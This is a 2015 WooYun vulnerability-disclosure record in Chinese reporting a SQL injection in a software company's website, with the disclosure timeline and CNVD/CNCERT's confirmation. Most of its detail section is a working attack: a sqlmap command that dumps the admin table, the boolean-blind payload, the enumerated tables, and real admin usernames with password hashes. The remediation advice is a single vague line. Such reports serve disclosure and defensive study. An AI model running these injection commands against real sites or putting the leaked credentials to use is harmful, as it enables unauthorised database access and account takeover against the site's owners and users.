{"id": 81215, "wybug_id": "wooyun-2015-0154236", "wybug_title": "厦门市中软科技有限公司某站点存在SQL注入漏洞（admin密码泄露）", "wybug_corp": "厦门市中软科技有限公司", "wybug_author": "路人甲", "wybug_date": "2015-11-26 01:36", "wybug_open_date": "2016-01-11 15:34", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-11：\t细节向公众公开  简要描述：  厦门市中软科技有限公司位于环境优美的厦门市软件园内，自2004年成立以来，始终坚持“玉成祥和、服务始终”的宗旨，以全民享受科技产品带来方便快捷服务为己任，从基于软件研发、项目方案的集成商，发展为基于客户需求的IT增值服务商，业务范围涵盖软件、电子商务、安全存储、IC智能卡四个领域。是专门致力于研发和建设医保电子商务综合平台，以及社会保障、医疗卫生、金融行业相结合的“一卡通系统”和“城市一卡通”跨平台应用系统的方案解决供应商和软件技术开发、咨询服务为一体的高新技术企业。    公司拥有多个具有自主知识产权的“玉祥”系列软件产品，主要由“五险合一信息管理系统”、“医保、工伤、生育三险合一管理系统”、 “新农村养老保险信息管理系统”、“省级区域异地就医信息系统管理平台”、“医疗保险网上综合业务平台”、“民政医疗救助同步结算信息管理系统”、“ 一卡通全民医疗保险信息管理系统”、“一卡通新农村合作医疗信息管理系统”、“城乡居民医保门诊银行一卡通结算信息管理系统”、“银行中间件业务平台一卡通中间件”等。其中 “一卡通全民医疗保险信息管理系统”、“省级区域异地就医信息系统管理平台”、“医保网上业务综合平台” 系统的先进性和适用性处于行业内领先地位，为广大老百姓和经办业务人员提供了方便快捷的信息化服务。 详细说明：  地址：http://**.**.**.**/xxhs.asp?classid=92\npython sqlmap.py -u \"http://**.**.**.**/xxhs.asp?classid=92\" -p classid--technique=B --random-agent --batch --threads=10 -T admin -C id,admin,manager,name,oassword --dump\n   漏洞证明：  \nback-end DBMS: Microsoft Accesscurrent user:\tNonecurrent user is DBA:\tNoneDatabase: Microsoft_Access_masterdb+---------+---------+| Table   | Entries |+---------+---------+| news    | 196     || `user`  | 65      || product | 9       || company | 4       || admin   | 3       || service | 2       |+---------+---------+\n\nDatabase: Microsoft_Access_masterdbTable: admin[7 columns]+----------+-------------+| Column   | Type        |+----------+-------------+| admin    | non-numeric || classid  | non-numeric || grade    | numeric     || id       | numeric     || manager  | non-numeric || name     | non-numeric || password | non-numeric |+----------+-------------+sqlmap resumed the following injection point(s) from stored session:---Parameter: classid (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: classid=92 AND 3570=3570---web server operating system: Windows 2008 R2 or 7web application technology: ASP.NET, Microsoft IIS 7.5, ASPback-end DBMS: Microsoft AccessDatabase: Microsoft_Access_masterdbTable: admin[3 entries]+----+---------------+-------+------------------------------------------+---------+---------+------------------------+----------+| id | classid       | grade | password                                 | admin   | manager | name                   | oassword |+----+---------------+-------+------------------------------------------+---------+---------+------------------------+----------+| 37 | N-?O\\x18R\\xbf | 1     | 4ef6119dc07f66e3f84677e04ef6119dcce22b3a | admin   | <blank> | \\x7fQz\\xd9{\\xa1t\\x06TX | <blank>  || 92 | N-?O\\x18R\\xbf | 2     | 8751e0396fb6635cab9c528b8751e0394552cb99 | dhszlqn | <blank> | gNQh?                  | <blank>  || 93 | N-?O\\x18R\\xbf | 2     | 762a73674f3a17d0b1454035762a7367314ed2d2 | lxf     | <blank> | R\\x18\\\\\\x0fQ\\xe4       | <blank>  |+----+---------------+-------+------------------------------------------+---------+---------+------------------------+----------+\n   修复方案：  增加过滤。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-11-27 14:41 厂商回复： CNVD确认并复现所述漏洞情况，已经转由CNCERT下发给福建分中心，由福建分中心后续协调网站管理单位处置。  最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}